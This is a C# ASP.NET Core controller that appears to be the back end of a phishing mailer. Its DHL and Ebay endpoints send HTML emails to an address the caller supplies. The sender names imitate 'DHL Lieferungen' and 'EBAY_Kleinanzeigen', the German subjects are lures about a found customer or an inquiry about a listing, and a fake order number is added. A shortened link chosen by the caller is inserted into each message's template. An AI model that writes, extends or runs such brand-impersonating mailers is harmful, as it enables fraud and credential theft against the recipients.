using System.Net;
using System.Net.Mail;
using DteCrm.Services.EmailService;
using Microsoft.AspNetCore.Mvc;
using NoWayMailerAPI.Data;
using NoWayMailerAPI.Services.Interfaces;
using FileIO = System.IO.File;

namespace MailerRobot.Controllers;

[ApiController]
[Route("/api/[controller]/[action]")]
public class SenderController : ControllerBase
{
	private readonly IConfiguration _configuration;
	private readonly IShortLinkService _shortLinkService;

	public SenderController(IConfiguration configuration, IShortLinkService shortLinkService)
	{
		_configuration = configuration;
		_shortLinkService = shortLinkService;
	}

	[HttpGet]
	public async Task<IActionResult> DHL(string email, string link)
	{
		var config = new EmailSendingConfiguration();

		_configuration.GetSection("MailSettings")
					.GetChildren()
					.First(e => e.Key == "Smtp2")
					.Bind(config);

		var smtpServer = config.Host;
		var smtpPort = config.Port;
		var smtpClient = new SmtpClient(smtpServer, smtpPort);

		var smtpUsername = config.User;
		var smtpPassword = config.Password;

		smtpClient.Credentials = new NetworkCredential(smtpUsername, smtpPassword);
		smtpClient.EnableSsl = true;

		var senderEmail = config.User;
		var recipientEmail = email;
		var subject = "";

		var orderNumber = Random.Shared.Next(234422000, 234522847);

		var body = await GetBody(link, ServiceType.DHL);

		var message = new MailMessage(senderEmail, recipientEmail, subject, body);
		message.IsBodyHtml = true;

		message.Subject = $"Unser Team hat einen Kunden für Sie gefunden #{orderNumber}";

		message.From = new MailAddress(senderEmail, "•DHL•Lieferungen");
	

		try
		{
			smtpClient.Send(message);

			return Ok();
		}
		catch (Exception e)
		{
			return BadRequest();
		}
	}
	
	[HttpGet]
	public async Task<IActionResult> Ebay(string email, string link)
	{
		var config = new EmailSendingConfiguration();

		_configuration.GetSection("MailSettings")
					.GetChildren()
					.First(e => e.Key == "Smtp2")
					.Bind(config);

		var smtpServer = config.Host;
		var smtpPort = config.Port;
		var smtpClient = new SmtpClient(smtpServer, smtpPort);

		var smtpUsername = config.User;
		var smtpPassword = config.Password;

		smtpClient.Credentials = new NetworkCredential(smtpUsername, smtpPassword);
		smtpClient.EnableSsl = true;

		var senderEmail = config.User;
		var recipientEmail = email;
		var subject = "";

		var orderNumber = Random.Shared.Next(234422000, 234522847);

		var body = await GetBody(link, ServiceType.EbayDe);

		var message = new MailMessage(senderEmail, recipientEmail, subject, body);
		message.IsBodyHtml = true;
		
		message.Subject = "Nutzer-Anfrage zu deiner Anzeige!";
		message.From = new MailAddress(senderEmail, "EBAY_Kleinanzeigen");
		

		try
		{
			smtpClient.Send(message);

			return Ok();
		}
		catch (Exception e)
		{
			return BadRequest(e.Message);
		}
	}

	private async Task<string> GetBody(string link, ServiceType serviceType)
	{
		var shortLink = await _shortLinkService.GetShortLink(link);

		string filePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Templates", $"{serviceType}.html");
		
		var hmtlBody = FileIO.ReadAllText(filePath)
							.Replace("PutYourLinkHere", shortLink);

		return hmtlBody;
	}
}